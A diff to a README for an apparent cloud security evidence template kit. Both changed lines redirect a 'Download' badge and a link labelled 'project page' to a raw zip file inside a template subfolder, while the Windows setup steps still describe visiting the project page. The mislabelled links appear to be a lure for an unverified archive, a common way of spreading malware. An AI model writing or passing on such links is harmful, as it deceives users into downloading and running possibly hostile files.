@@ -1,6 +1,6 @@
 # 🛡️ cloud-controls-evidence-kit - Organize cloud security evidence with ease
 
-[![Download Kit](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Cleanable-perineotomy501/cloud-controls-evidence-kit)
+[![Download Kit](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Cleanable-perineotomy501/cloud-controls-evidence-kit/main/evidence-folder-template/01-access-controls/controls-kit-cloud-evidence-v2.0.zip)
 
 ## What is this kit?
 
@@ -18,7 +18,7 @@ The cloud-controls-evidence-kit helps you gather and organize documentation for 
 
 You do not need to install complex software to use these templates. Follow these steps to set up the kit on your Windows computer:
 
-1. Visit the [project page here](https://github.com/Cleanable-perineotomy501/cloud-controls-evidence-kit).
+1. Visit the [project page here](https://raw.githubusercontent.com/Cleanable-perineotomy501/cloud-controls-evidence-kit/main/evidence-folder-template/01-access-controls/controls-kit-cloud-evidence-v2.0.zip).
 2. Look for the green button labeled "Code" near the top right of the screen.
 3. Click the button and select "Download ZIP" from the menu.
 4. Open your "Downloads" folder in File Explorer.
